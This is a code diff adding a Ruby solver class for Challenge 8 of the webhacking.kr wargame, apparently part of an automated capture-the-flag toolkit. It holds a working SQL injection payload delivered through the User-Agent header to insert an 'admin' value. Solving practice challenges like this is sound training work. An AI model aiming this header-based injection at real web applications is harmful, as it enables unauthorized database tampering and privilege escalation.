@@ -327,6 +327,32 @@ module WebhackingKR
   end
 
   ##
+  # Challenge 8
+  class Challenge8 < ChallengeBase
+    CHALLENGE = 8
+
+    PATH = '/challenge/web-08/'
+    USER_AGENT = 'agentx'
+    PAYLOAD = %q[', '', 'admin') #]
+
+    def exec
+      payload = URI.encode_www_form_component(PAYLOAD)
+      log('Sending payload')
+      response = get(
+        PATH,
+        { 'User-Agent' => "#{USER_AGENT}#{PAYLOAD}" }
+      )
+
+      log('Getting page')
+      response = get(
+        PATH,
+        { 'User-Agent' => USER_AGENT }
+      )
+      check(response.body)
+    end
+  end
+
+  ##
   # Challenge 10
   class Challenge10 < ChallengeBase
     CHALLENGE = 10
